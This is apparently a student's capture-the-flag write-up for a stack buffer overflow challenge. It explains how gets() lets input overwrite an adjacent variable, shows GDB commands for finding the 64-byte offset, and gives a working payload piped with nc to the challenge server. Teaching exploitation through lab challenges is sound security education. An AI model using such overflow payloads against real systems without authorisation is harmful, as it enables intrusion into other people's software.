# Challenge `Match an Exact Value` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow
- Where: Where is the vulnerability present
  - The vulnerability is located in the `main` function, at the line:`gets(buffer);`. The `buffer` buffer (64 bytes) is allocated on the stack before the integer variable `test`.
By providing more than 64 bytes of input, the overflow allows overwriting `test`.
- Impact: What results of exploiting this vulnerability
  - Overwrite the value of the variable test
  - Set it to the exact value 0x61626364
  - Trigger the winning condition of the program

## Steps to reproduce

1. Code analysis: 
```c
int test;
char buffer[64];
```
Because buffer is stored before test on the stack, overflowing buffer allows direct control over test.
2. Stack analysis using GDB
```
break main
run
next
next
next
print &buffer
print &test
print (char*)&test - (char*)&buffer
```
Output: `$3 = 64`
3. The program checks for `test == 0x61626364`. However, the system uses little-endian format.
This means the least significant byte is stored first in memory.
So, to write 0x61626364 into memory, we must input: `dcba`
4. The payload consists of 64 bytes to fill buffer plus 4 bytes (dcba) to overwrite test with `0x61626364`
5. Send the payload to the remote server using nc:
```bash
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25152
print("A"*64 + "dcba")
EOF
```
